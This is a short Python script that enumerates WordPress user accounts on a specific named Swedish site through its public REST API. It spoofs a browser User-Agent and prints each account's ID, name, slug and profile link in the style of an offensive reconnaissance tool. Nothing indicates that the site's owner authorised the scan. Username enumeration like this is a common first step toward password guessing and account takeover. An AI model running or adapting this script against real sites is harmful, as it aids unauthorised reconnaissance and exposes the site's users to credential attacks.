import urllib.request
import json

url = "https://medistore.se/wp-json/wp/v2/users"
req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})

try:
    with urllib.request.urlopen(req) as resp:
        users = json.loads(resp.read().decode("utf-8"))
        print(f"[*] Found {len(users)} WordPress user(s):\n")
        for user in users:
            print(f"ID: {user.get('id')} | Name: {user.get('name')} | Slug: {user.get('slug')} | Link: {user.get('link')}")
except Exception as e:
    print(f"[-] Error fetching users: {e}")
